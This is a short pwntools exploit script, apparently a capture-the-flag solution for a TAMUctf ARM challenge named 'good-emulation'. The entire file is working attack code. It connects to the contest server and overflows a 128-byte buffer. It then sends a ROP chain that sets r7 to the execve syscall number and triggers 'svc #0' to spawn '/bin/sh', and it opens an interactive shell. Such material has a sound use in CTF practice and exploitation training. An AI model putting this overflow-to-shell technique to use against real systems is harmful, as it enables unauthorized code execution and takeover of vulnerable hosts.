from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="good-emulation")
# p = process(["qemu-arm-static","-g","13337", "./good-emulation"])
# pause()

payload  = b'/bin/sh\0'
payload += b'A'*(128-len(payload))
payload += p32(0)
payload += p32(0x2ea68) # pop {r7, pc} ;
payload += p32(0xb)     # execve
payload += p32(0x102ac) # svc #0 ;
p.sendline(payload)

p.interactive()
